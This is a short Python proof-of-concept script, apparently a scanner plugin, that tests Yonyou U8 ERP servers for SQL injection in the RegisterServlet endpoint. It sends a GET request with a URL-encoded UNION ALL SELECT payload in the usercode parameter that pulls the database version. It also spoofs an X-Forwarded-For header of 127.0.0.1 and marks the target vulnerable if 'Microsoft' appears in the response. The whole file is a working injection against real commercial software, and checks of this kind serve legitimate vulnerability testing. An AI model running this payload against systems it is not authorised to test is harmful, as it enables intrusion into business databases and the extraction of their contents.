import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U8-nc.bs.sm.login2.RegisterServlet存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'X-Forwarded-For': '127.0.0.1',
        'Cookie': 'JSESSIONID=D523370AE42E1D2363160250C914E62A.server'
    }
    vurl = urllib.parse.urljoin(url, "/servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL--%20Jptd")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and 'Microsoft' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult